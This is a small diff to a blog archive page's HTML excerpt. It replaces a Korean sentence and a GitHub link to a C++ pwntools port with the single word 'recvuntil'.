-    <p class="archive__item-excerpt" itemprop="description">라이브러리로 작성된 완전한 코드는 아래에서 확인 가능하다.
-https://github.com/lucid78/pwntoolscpp
+    <p class="archive__item-excerpt" itemprop="description">
+recvuntil
 </p>
   </article>
 </div>
